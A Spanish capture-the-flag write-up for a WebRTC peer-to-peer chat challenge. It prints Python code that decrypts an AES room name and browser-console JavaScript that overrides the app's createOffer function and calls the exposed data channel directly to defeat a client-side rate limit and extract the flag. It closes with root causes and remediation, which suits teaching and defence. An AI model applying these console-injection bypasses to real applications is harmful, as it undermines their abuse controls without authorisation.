# Direct Chat — Writeup

**Plataforma:** HackLab (SoftwareSeguro)
**Edición:** HackLab 2025
**Categoría:** WebRTC
**Autor:** adonaissh

## Descripción del desafío

DirectChat es un chat P2P uno-a-uno construido sobre WebRTC. El objetivo
es lograr que el usuario `sniper` envíe una clave secreta — pero Sniper
solo la comparte cuando recibe **dos zumbidos ("buzz") en menos de un
segundo**.

Datos entregados:
- Usuarios de prueba:
  ```
  master:388aca4e801814e2be9b74b906e80f9a56b04a365cae90323f6cdd1a2870c356
  sythor:a7a0a5a67324ab81983fac14a1c5884c7ff4612c318fbd2007966fc3d92efc12
  ```
- Nombre de la room, cifrado: `"PK8EdNdV53YOEsO6WGVFvw=="`, descrito como
  "AES-256 CBC con la clave `PIZZA`, 1000 iteraciones y sin salt".
- Una función de ingeniería social (1 uso por minuto) que fuerza a Sniper
  a entrar al chat — no debe atacarse en sí misma, es la vía legítima para
  traer a la víctima.

## Teoría — WebRTC en dos capas

1. **Señalización (signaling):** antes de establecer la conexión directa
   entre navegadores, se intercambia metadata (SDP offer/answer, ICE
   candidates) a través de un servidor intermediario (acá, un WebSocket:
   `wss://direct-chat.shared.softwareseguro.com.ar/ws`).
2. **Conexión P2P real (RTCDataChannel):** una vez negociada, los mensajes
   viajan **directo entre los navegadores**, sin pasar por el servidor. Si
   la lógica de negocio (como "¿llegaron 2 eventos en menos de 1
   segundo?") se valida del lado del **cliente** en vez del servidor —
   algo común cuando no hay servidor en el medio de esa comunicación — esa
   validación puede manipularse desde la consola del navegador de
   cualquiera de los dos peers.

## Paso 1 — Descifrar el nombre de la room

El primer intento asumió el esquema clásico de OpenSSL
(`EVP_BytesToKey`, derivación por MD5 iterado), replicado en Python:

```python
import hashlib
import base64
from Crypto.Cipher import AES

def evp_bytestokey(password, salt, key_len, iv_len, iterations):
    d = d_i = b''
    password = password.encode()
    while len(d) < key_len + iv_len:
        d_i = hashlib.md5(d_i + password + salt).digest()
        for _ in range(iterations - 1):
            d_i = hashlib.md5(d_i).digest()
        d += d_i
    return d[:key_len], d[key_len:key_len+iv_len]

ciphertext_b64 = "PK8EdNdV53YOEsO6WGVFvw=="
key, iv = evp_bytestokey("PIZZA", b'', 32, 16, 1000)
ciphertext = base64.b64decode(ciphertext_b64)
cipher = AES.new(key, AES.MODE_CBC, iv)
decrypted = cipher.decrypt(ciphertext)
```

Resultado: bytes sin sentido (`15a68cfcd0b9be0cc91e177663511b61` en hex),
confirmando que ese no era el esquema correcto.

> El ciphertext en base64 decodifica a exactamente **16 bytes** (un solo
> bloque AES), sin el prefijo `"Salted__"` típico de OpenSSL con salt —
> consistente con "sin salt", pero insuficiente por sí solo para
> determinar el algoritmo de derivación de clave.

### Segundo intento — PBKDF2-SHA256 (OpenSSL moderno con `-iter`)

Desde OpenSSL 1.1.0+, al usar la opción `-iter N` en `openssl enc`, la
derivación de clave deja de ser `EVP_BytesToKey` (MD5 iterado) y pasa a
ser **PBKDF2 con SHA256**. Esto encaja mejor con el enunciado
("1000 iteraciones" tiene sentido como parámetro de PBKDF2, no como
cantidad de rondas de MD5 clásicas):

```python
cat << 'EOF' > descifrar_room4.py
import base64
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Hash import SHA256

ciphertext_b64 = "PK8EdNdV53YOEsO6WGVFvw=="
password = b"PIZZA"
salt = b''
iterations = 1000

# PBKDF2 con SHA256, derivando key(32)+iv(16) = 48 bytes
derived = PBKDF2(password, salt, dkLen=48, count=iterations, hmac_hash_module=SHA256)
key = derived[:32]
iv = derived[32:48]

print("key hex:", key.hex())
print("iv hex:", iv.hex())

ciphertext = base64.b64decode(ciphertext_b64)
cipher = AES.new(key, AES.MODE_CBC, iv)
decrypted = cipher.decrypt(ciphertext)
print("decrypted raw hex:", decrypted.hex())
try:
    pad_len = decrypted[-1]
    unpadded = decrypted[:-pad_len]
    print("Room descifrada:", unpadded.decode())
except Exception as e:
    print("Error decodificando:", e)
    print("raw:", decrypted)
EOF
python3 descifrar_room4.py
```

Salida:
```
key hex: 20630482a49894fd79669a7e22269ed7796301b4b7a85526594a145306efc0d6
iv hex: 1c5dfff25dce7c3dad2c071ec425464b
decrypted raw hex: 6861636b6c6162090909090909090909
Room descifrada: hacklab
```

El padding PKCS7 (`09` × 9 al final) es perfectamente válido, confirmando
la derivación correcta.

**Nombre de la room:** `hacklab`

## Paso 2 — Conectar y revisar el cliente (`app.js`)

Con `room: hacklab`, `nick: master` y como password la **cadena completa**
provista en "Usuarios de prueba"
(`388aca4e801814e2be9b74b906e80f9a56b04a365cae90323f6cdd1a2870c356`), la
conexión al WebSocket de señalización fue exitosa.

Descargando `app.js` se encontró la lógica completa del cliente. Puntos
clave:

```javascript
const BUZZ_COOLDOWN_MS = 10_000;
let lastBuzzAt = 0;

function sendBuzz() {
    ...
    const now = Date.now();
    const elapsed = now - lastBuzzAt;
    if (elapsed < BUZZ_COOLDOWN_MS) {
        // bloquea el reenvio si no pasaron 10s
        return;
    }
    ...
    dc.send(JSON.stringify(payload));
    lastBuzzAt = now;
    ...
}
```

El cooldown de 10 segundos entre zumbidos está controlado **enteramente
en el cliente** (variable JS `lastBuzzAt`), a través del botón de la UI.
Pero `dc` (el `RTCDataChannel`) es una variable global accesible desde la
consola del navegador — nada impide llamar `dc.send(...)` directamente,
saltándose por completo la función `sendBuzz()` y su cooldown.

Del lado receptor, tampoco hay validación de tiempo:
```javascript
dc.onmessage = (e) => {
    const payload = JSON.parse(e.data);
    if (payload?.type === 'buzz' || payload?.text === '__buzz__') {
        addMessage(payload.nick || 'Peer', '— zumbido —', 'peer buzz');
        showBuzzEffect('peer');
        ...
        return;
    }
    ...
};
```

Confirma que el lado del cliente de Sniper **también** se limita a
mostrar el efecto visual por cada mensaje `type: 'buzz'` recibido — la
lógica de "¿llegaron 2 en menos de 1 segundo?" vive en otro lado (del
lado de Sniper, probablemente en su propio script simulado), pero nada en
el protocolo impide mandar los mensajes `buzz` crudos vía `dc.send()`.

## Paso 3 — Primeros intentos fallidos: negociación WebRTC trabada

El primer intento de ejecutar `dc.send(...)` directo en consola falló:
```
Uncaught InvalidStateError: Failed to execute 'send' on 'RTCDataChannel':
RTCDataChannel.readyState is not 'open'
```

Diagnóstico con:
```javascript
console.log('WS:', ws.readyState, 'PC:', pc?.connectionState, 'DC:', dc?.readyState);
// WS: 1  PC: new  DC: connecting
```

`PC: new` indicaba que la `RTCPeerConnection` nunca arrancó una
negociación real. Revisando el código:
```javascript
ws.onopen = async () => {
    logSys('Conectado');
    await createOffer();   // se dispara SIEMPRE al conectar el WS
};
```

Como ambos peers (el atacante y Sniper) ejecutan `createOffer()`
automáticamente apenas abren su WebSocket, sin esperar a ver quién llegó
primero, se producía una **colisión de ofertas** ("glare"): si las dos
partes ofrecen al mismo tiempo, y el código no contempla ese caso, la
negociación queda trabada indefinidamente (`DC: connecting` sin avanzar,
confirmado dejando correr un contador por más de 60 segundos sin cambios).

### Solución: neutralizar la oferta propia

Como `createOffer` es una función global (el script se carga como
`<script>` clásico, no como módulo), se pudo **sobreescribir desde la
consola antes de conectar**, para que el cliente atacante nunca mande su
propia oferta y solo responda a la de Sniper:

```javascript
createOffer = async function() { console.log('oferta propia desactivada'); };
```

Aplicado **antes** de pulsar "Conectar" (un primer intento aplicándolo
después de que `ws.onopen` ya se había disparado no tuvo efecto, porque
la oferta original ya se había mandado).

## Paso 4 — Ajuste de timing para no perder la ventana de Sniper

Con la oferta propia desactivada, la negociación avanzó y el
`RTCDataChannel` llegó a `open`. Se armó un script que detecta el momento
exacto en que abre y dispara los dos zumbidos:

```javascript
const checkDC = setInterval(() => {
    if (dc && dc.readyState === 'open') {
        clearInterval(checkDC);
        dc.send(JSON.stringify({type: 'buzz', nick: 'master', t: Date.now()}));
        dc.send(JSON.stringify({type: 'buzz', nick: 'master', t: Date.now()}));
        console.log('ZUMBIDOS ENVIADOS');
    }
}, 100);
```

**Primer resultado:** Sniper se conectó, mandó un mensaje de texto
("hola") y se desconectó sin entregar la clave. Los dos zumbidos,
disparados en el mismo instante en que el canal abrió, probablemente
llegaron **antes** de que la lógica de Sniper terminara de inicializarse
y empezara a "escuchar" realmente los buzz.

**Segundo intento:** se probó esperar a que llegara el mensaje de saludo
de Sniper antes de zumbar (enganchando un handler extra sobre
`dc.onmessage`), pero el saludo no llegó a tiempo de ser interceptado —
probablemente se emitía en el mismo instante que la apertura del canal.

**Ajuste final — dar margen de tiempo, no esperar un evento:**

```javascript
const checkDC3 = setInterval(() => {
    if (dc && dc.readyState === 'open') {
        clearInterval(checkDC3);
        console.log('DC abierto, esperando 500ms de margen...');
        setTimeout(() => {
            dc.send(JSON.stringify({type: 'buzz', nick: 'master', t: Date.now()}));
            console.log('Zumbido 1 enviado');
            setTimeout(() => {
                dc.send(JSON.stringify({type: 'buzz', nick: 'master', t: Date.now()}));
                console.log('Zumbido 2 enviado (deberia estar <1s del primero)');
            }, 300);
        }, 500);
    }
}, 100);
```

Se espera 500 ms tras la apertura del canal (margen para que la lógica de
Sniper termine de inicializarse) y se mandan los dos zumbidos con 300 ms
de diferencia entre sí — bien por debajo del límite de 1 segundo exigido,
pero con el margen suficiente para no pisar el arranque de la sesión de
Sniper.

## Secuencia completa de explotación (resumen)

1. Descifrar el nombre de la room offline (PBKDF2-SHA256).
2. Conectar al chat con `room: hacklab`, `nick: master` y la contraseña
   provista.
3. **Antes** de conectar, sobreescribir `createOffer` en consola para que
   el cliente propio no inicie negociación (evita glare con Sniper).
4. Dejar corriendo un poll que detecta la apertura del `RTCDataChannel`.
5. Disparar la función de ingeniería social para que Sniper entre a la
   sala.
6. Al abrirse el canal, esperar ~500 ms y enviar dos mensajes
   `{"type":"buzz", ...}` directo por `dc.send()`, separados por ~300 ms,
   saltándose por completo el cooldown de 10 segundos de la función
   `sendBuzz()` de la UI.

### Resultado

```
sniper — hola
sniper — b9365cb4c17b4f3b93f0095619bcd1ea
```

**Flag:** `b9365cb4c17b4f3b93f0095619bcd1ea`

## Causa raíz y remediación

- **Causa raíz (principal):** la restricción de "un zumbido cada 10
  segundos" se aplica únicamente en la función `sendBuzz()` del cliente
  JavaScript, que es solo una interfaz de conveniencia sobre el canal
  real. El propio `RTCDataChannel` (`dc`) queda expuesto como variable
  global, permitiendo enviar mensajes `buzz` arbitrarios sin pasar por
  ningún control de límite de tasa. Es un caso de **validación de lógica
  de negocio delegada enteramente al cliente**, agravado en este contexto
  porque en WebRTC el "cliente" de uno de los peers es, ni más ni menos,
  la contraparte con la que se negocia la conexión — no hay ningún
  servidor en el medio de esa comunicación que pueda aplicar el límite.

- **Causa raíz (secundaria):** la negociación WebRTC no maneja el caso de
  colisión de ofertas (glare) cuando ambos peers intentan ofrecer
  simultáneamente, lo que puede trabar conexiones legítimas — no es una
  vulnerabilidad en sí, pero sí una fragilidad que terminó siendo
  necesario explotar (desactivando la oferta propia) para lograr avanzar.

- **Remediación recomendada:**
  1. **Nunca confiar en el cliente para aplicar límites de tasa o reglas
     de negocio** sobre un canal que el propio cliente controla. Si el
     límite de "2 zumbidos en 1 segundo" debe prevenir abuso, la
     validación tiene que vivir en un componente que el atacante no
     controle — por ejemplo, en el servidor de señalización, actuando
     como un relay obligatorio para los eventos `buzz` en lugar de dejar
     que viajen libremente por el DataChannel P2P.
  2. Si el diseño requiere comunicación P2P directa por razones de
     latencia, implementar el control en ambos extremos de forma
     defensiva: descartar mensajes `buzz` que excedan una tasa razonable,
     en vez de asumir que el emisor va a respetar el cooldown.
  3. Implementar **perfect negotiation** (patrón estándar recomendado por
     la especificación WebRTC) para manejar correctamente colisiones de
     oferta, en vez de que ambos peers ofrezcan incondicionalmente al
     conectar.
  4. No derivar claves criptográficas a partir de contraseñas cortas y
     adivinables ("PIZZA") para proteger metadata operativa (como el
     nombre de una sala); aunque no sea el dato más sensible del sistema,
     revela información de diseño y facilita reconocimiento.

## Herramientas usadas

- Python 3 + `pycryptodome` (descifrado offline del nombre de la room)
- DevTools del navegador — pestaña Console (ejecución directa de JS sobre
  `RTCPeerConnection`/`RTCDataChannel`, lectura de `app.js`)